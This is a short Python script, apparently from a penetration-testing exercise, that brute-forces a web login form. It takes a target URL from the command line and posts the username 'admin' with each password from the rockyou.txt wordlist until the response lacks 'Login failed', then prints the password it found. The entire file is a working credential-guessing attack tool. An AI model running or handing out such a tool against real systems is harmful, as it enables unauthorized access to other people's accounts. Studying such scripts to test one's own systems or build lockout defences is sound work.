# Imports
import requests
import optparse


# Getting arguments from CLI
def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Specify Target URL")

    (options, arguments) = parser.parse_args()

    if not options.target:
        parser.error("[-] Please specify a target URL, use --help for more info.")

    return options


# Target
target_url = get_arguments().target

# Guessing Login Password
data = {"username": "admin", "password": "", "Login": "submit"}

with open("/usr/share/wordlists/rockyou.txt", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data["password"] = word
        response = requests.post(target_url, data=data)
        if "Login failed" not in response.content.decode(errors="ignore"):
            print("[+] Got the password: " + str(word))
            exit()

print("[+] Checked the complete wordlist")
